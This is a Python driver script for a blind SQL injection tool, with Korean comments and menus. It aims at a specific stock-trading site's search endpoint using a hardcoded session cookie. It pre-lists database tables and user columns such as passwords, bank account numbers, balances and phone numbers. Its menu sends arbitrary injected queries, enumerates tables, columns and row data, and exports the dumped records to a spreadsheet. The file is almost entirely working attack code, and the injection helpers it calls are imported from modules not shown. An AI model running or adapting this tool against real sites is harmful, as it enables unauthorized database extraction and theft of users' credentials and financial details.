from attack_setting import attackData,tableInfo
from attack_query import *
from get_infos import *


#공격 대상 URL 및 초기 쿠키 설정 
url = "https://www.rookiestock.com/search"
cookies = {
    "JSESSIONID":"201574BCB8517113C534D7F22982A392"
}


attack_query = ''
page = attackData()
#query = attackQuerys()
page.set_url(url)
page.set_cookies(cookies)

result = tableInfo()
table_list=['Users','Board', 'Community', 'Notice', 'OrderStockHistory', 'Stock', 'StockHistory', 'Stock_Price', 'Transaction', 'Transfer_history', 'UserStock', 'file', 'notice', 'stock_index', 'user']
for t in table_list:
    result.append_table(t)

user_column_list = ['USER_ID','USER_PW','USER_NM','ACCESS_LEVEL','USER_BIRTH','USER_ACCOUNT_NUMBER', 'USER_BANK','ACCOUNT_BALANCE', 'USER_AGENCY','USER_TELNO']



for c in user_column_list:
    result.append_column('Users',c)



#쿼리 설정 및 요청 보내기(POST)
print(page.send_post_request())

#기본 설정 보기 
#page.show

#쿼리 테스트
#table_count_query = query.get_table_query('count')
#table_length_query = query.get_table_query('length',rnum=1)
#table_data_query = query.get_table_query('data',rnum=1)

#column_count_query = query.get_column_query('count',table_name='MEMBER')
#column_length_query = query.get_column_query('length',table_name='ANSWER',rnum=1)
#column_data_query = query.get_column_query('data',table_name='ANSWER',rnum=1)

#data_count_query = query.get_data_query('count',table_name='ANSWER',column_name='ANSWER')
#data_length_query = query.get_data_query('length',table_name='ANSWER',column_name='ANSWER',rnum=1)
#data_query = query.get_data_query('data',table_name='ANSWER',column_name='ANSWER',rnum=1)

#print(data_query)
#binary_search(page,column_count_query)
#letter_search(page,data_query,4)

print("main 시작")
#tables = get_table_infos(page)
#get_column_infos(page,result,'ANSWER')
#get_table_data(page,result,'ANSWER')

state=""
while(state != 'q'):

    print("\n기능 목록")
    print('='*25)
    print("1. 사이트 URL 설정")
    print("2. 사이트 SessionID 설정")
    print("3. 공격대상 설정 보기")

    print('-'*23)
    print("4. 쿼리 요청")
    print("5. 테이블 탐색")
    print("6. 컬럼 탐색")
    print("7. 테이블 내 데이터 탐색")

    print('-'*23)
    print("8. 테이블 정보 출력")
    print("9. 컬럼 정보 출력")
    print("10. 데이터 정보 출력")
    print("11. 데이터 내보내기(.xlsx)")
    print('='*25)

    user_input = input("원하는 명령의 숫자를 입력 : ")

    match user_input:
        case '1': #사이트 URL 설정 
            print(f"현재 URL : {page.base_url}") 
            if input("새로운 url로 변경하시겠습니까? [y/n] : ")=='y':
                page.set_url(input("새로운 url 입력 : ")) 
                
                
        case '2': #SESSIONID 설정
            print(f"현재 SESSIONID : {page.cookies['JSESSIONID']}") 
            if input("SessionID를 새로 설정하시겠습니까? [y/n] : ")=='y':
                page.set_sessionID(input("새로운 SessionID 입력 : ")) 
                
                
        case '3': #공격 대상 설정 보기
            page.show()


        case '4':
            user_query = input("공격 대상 사이트에 실행할 쿼리(전체 검색어)를 입력 : ")
            print(f"처리 결과 : {page.send_post_request(user_query)}")

        case '5':
            page.show()
            if input("\n현재 설정으로 테이블 탐색 시작[y/n] : ")=='y':
                tables = getData.get_tables(page)
        
        case '6':
            page.show()
            result.show_tables()
            user_table = input("\n컬럼을 탐색할 테이블명 입력(모든 컬럼 탐색 -> All 입력) : ")
            if user_table=='All':
                print("\n모든 테이블의 컬럼을 탐색")
                for table in result.tables:
                    getData.get_columns(page,result,table)
            elif user_table in result.tables:
                getData.get_columns(page,result,user_table)
            else:
                print("테이블 목록에 있는 테이블을 입력해주세요. ")
        
        case '7':
            page.show()
            result.show_columns()
            user_table = input("\n데이터 탐색을 할 테이블명 입력(모든 데이터 탐색 -> All 입력) : ")
            if user_table=='All':
                print("\n모든 테이블의 데이터를 탐색")
                for table in result.tables:
                    getData.get_datas(page,result,table)
            elif len(result.columns[user_table])!=0:
                getData.get_datas(page,result,user_table)
            else:
                print("해당 테이블의 컬럼 탐색을 먼저 진행해주세요. ")
        
        case '8':
            result.show_tables()

        case '9':
            print()
            result.show_columns()

        case '10':
            result.show_tables()
            user_table = input("데이터 출력을 원하는 테이블을 지정해주세요. ")
            result.show_data(user_table)
        
        case '11':
           result.export_data_xlsx()
           print("xlsx 파일 생성됨")

        case _: 
            print("존재하지 않는 명령어")
        
    state= input("\n계속 실행을 원하시면 엔터를 눌러주세요... (exit=q)")

print("프로그램 종료")